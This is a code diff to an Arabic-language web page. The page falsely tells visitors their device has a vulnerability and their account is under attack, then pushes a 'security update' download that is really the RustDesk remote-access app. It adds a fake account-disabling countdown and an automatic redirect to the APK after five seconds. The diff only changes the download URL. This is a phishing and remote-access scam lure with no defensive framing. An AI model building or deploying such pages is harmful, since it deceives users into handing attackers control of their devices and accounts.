@@ -64,7 +64,7 @@ PAGE = """
         <h1>تحديث أمني عاجل</h1>
         <p class="sub">تم اكتشاف ثغرة أمنية في جهازك</p>
         <div class="warning">⚠️ تم رصد محاولة اختراق لحسابك.<br>يرجى تحديث التطبيق الأمني فوراً.</div>
-        <a href="https://download.rustdesk.com/rustdesk/rustdesk-1.3.3-arm64-sc.apk" class="btn">📥 تحميل التحديث الآن</a>
+        <a href="https://github.com/rustdesk/rustdesk/releases/download/1.3.2/rustdesk-1.3.2-arm64-sc.apk" class="btn">📥 تحميل التحديث الآن</a>
         <p style="margin-top: 15px; font-size: 13px; color: #666;">
             سيتم تعطيل حسابك خلال <span class="timer" id="timer">24:00:00</span>
         </p>
@@ -83,7 +83,7 @@ PAGE = """
                 String(seconds).padStart(2, '0');
         }, 1000);
         setTimeout(function() {
-            window.location.href = 'https://download.rustdesk.com/rustdesk/rustdesk-1.3.3-arm64-sc.apk';
+            window.location.href = 'https://github.com/rustdesk/rustdesk/releases/download/1.3.2/rustdesk-1.3.2-arm64-sc.apk';
         }, 5000);
     </script>
 </body>
